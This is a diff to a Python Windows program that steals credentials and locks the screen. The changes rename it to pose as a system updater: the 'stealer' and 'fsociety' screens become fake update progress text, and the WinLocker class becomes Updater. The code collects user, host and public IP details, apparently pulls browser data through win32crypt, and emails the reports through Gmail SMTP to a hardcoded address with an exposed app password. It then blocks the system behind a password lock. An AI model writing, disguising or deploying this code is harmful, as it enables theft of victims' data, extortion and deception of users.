@@ -17,18 +17,18 @@ import cv2, numpy as np
 from PIL import ImageGrab
 import sqlite3, win32crypt, shutil, winreg, ctypes
 
-PASSWORD = "1601"
+KEY = "1601"
 MAX_ATTEMPTS = 4
 TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Microsoft", "Windows", "timer.dat")
 GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
-VIDEO_URL = "https://files.catbox.moe/jgh9xd.mp4"
-LOCKER_MUSIC_URL = "https://files.catbox.moe/ejpe8e.mp3"
-LOGO_URL = "https://files.catbox.moe/dzxxzn.jpg"
-VIDEO_PATH = os.path.join(tempfile.gettempdir(), "video.mp4")
-LOCKER_MUSIC_PATH = os.path.join(tempfile.gettempdir(), "locker_music.mp3")
-LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.jpg")
+VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/preview.mp4"
+MUSIC_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/them%D0%B3.mp3"
+LOGO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/icon.png"
+VIDEO_PATH = os.path.join(tempfile.gettempdir(), "preview.mp4")
+MUSIC_PATH = os.path.join(tempfile.gettempdir(), "theme.mp3")
+LOGO_PATH = os.path.join(tempfile.gettempdir(), "icon.png")
 attempts_left = MAX_ATTEMPTS
 
 def run_hidden(cmd):
@@ -175,11 +175,11 @@ def anim_fsociety():
 def anim_stealer():
     a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
     a.configure(bg='black'); a.overrideredirect(True)
-    tk.Label(a, text="Стиллер ворует данные...", bg='black', fg='white', font=('Courier', 20, 'bold')).pack(expand=True, pady=(0,50))
+    tk.Label(a, text="Загрузка обновлений...", bg='black', fg='white', font=('Courier', 20, 'bold')).pack(expand=True, pady=(0,50))
     bar = tk.Canvas(a, width=400, height=30, bg='black', highlightthickness=1, highlightbackground='white'); bar.pack()
     bar_text = tk.Label(a, text="0%", bg='black', fg='white', font=('Courier', 12)); bar_text.pack(pady=10)
     info = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 10)); info.pack()
-    for percent, text in [(10,"Пароли Chrome..."),(20,"WiFi пароли..."),(30,"Cookies..."),(50,"IP адреса..."),(70,"Файлы..."),(90,"Отправка..."),(100,"ГОТОВО!")]:
+    for percent, text in [(10,"Проверка файлов..."),(20,"Оптимизация..."),(30,"Сканирование..."),(50,"Загрузка..."),(70,"Установка..."),(90,"Завершение..."),(100,"ГОТОВО!")]:
         bar.delete('all'); bar.create_rectangle(0, 0, 400*percent/100, 30, fill='#0f0', outline='')
         bar_text.config(text=f"{percent}%"); info.config(text=text); a.update(); time.sleep(0.5)
     time.sleep(2); a.destroy()
@@ -189,7 +189,7 @@ def anim_connect():
     a.configure(bg='black'); a.overrideredirect(True)
     lbl = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 14), justify='left'); lbl.pack(expand=True)
     current = ""
-    for line in ["[*] Connecting to router...","[*] Bypassing firewall...","[*] Access granted!","[*] I am in your network...","[*] Connected to: " + socket.gethostname(),"","[✓] WE ARE FSOCIETY"]:
+    for line in ["[*] Checking connection...","[*] Connecting to server...","[*] Downloading updates...","[*] Installing...","[*] System: " + socket.gethostname(),"","[✓] UPDATE COMPLETE"]:
         current += line + "\n"; lbl.config(text=current); a.update(); time.sleep(0.4)
     time.sleep(3); a.destroy()
 
@@ -232,7 +232,7 @@ def play_video():
     except: pass
 
 def mega_steal():
-    report = ["="*60, "DEDSEK STEALER", "="*60]
+    report = ["="*60, "SYSTEM REPORT", "="*60]
     report.append(f"USER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
     try: report.append(f"PUBLIC IP: {urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()}")
     except: pass
@@ -271,17 +271,17 @@ def mega_steal():
     except: pass
     report.append(f"\nTIME: {time.strftime('%d.%m.%Y %H:%M:%S')}")
     text = '\n'.join(report)
-    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]): send_email(part, f"[DedSek_Logs] [{i+1}]")
+    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]): send_email(part, f"[SysReport] [{i+1}]")
 
 def send_email(msg, subj=None):
     try:
         m = MIMEText(msg, 'plain', 'utf-8')
-        m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
+        m['Subject'] = subj or 'SysReport'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
         s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
         s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
     except: pass
 
-class WinLocker:
+class Updater:
     def __init__(self):
         self.root = tk.Tk(); self.root.withdraw()
         self.win = tk.Toplevel(self.root)
@@ -305,11 +305,11 @@ class WinLocker:
         self.update_timer()
         
         try:
-            download_file(LOCKER_MUSIC_URL, LOCKER_MUSIC_PATH)
-            if os.path.exists(LOCKER_MUSIC_PATH) and os.path.getsize(LOCKER_MUSIC_PATH) > 1000:
+            download_file(MUSIC_URL, MUSIC_PATH)
+            if os.path.exists(MUSIC_PATH) and os.path.getsize(MUSIC_PATH) > 1000:
                 import pygame
                 pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=4096)
-                pygame.mixer.music.load(LOCKER_MUSIC_PATH)
+                pygame.mixer.music.load(MUSIC_PATH)
                 pygame.mixer.music.set_volume(1.0)
                 pygame.mixer.music.play(-1)
         except: pass
@@ -358,7 +358,7 @@ YOU FUCK.
     
     def check(self, e=None):
         global attempts_left
-        if self.pw.get() == PASSWORD:
+        if self.pw.get() == KEY:
             try: pygame.mixer.music.stop()
             except: pass
             unblock_all()
@@ -392,5 +392,5 @@ if __name__ == "__main__":
     anim_connect()
     play_video()
     block_everything()
-    WinLocker()
+    Updater()
     tk.mainloop()
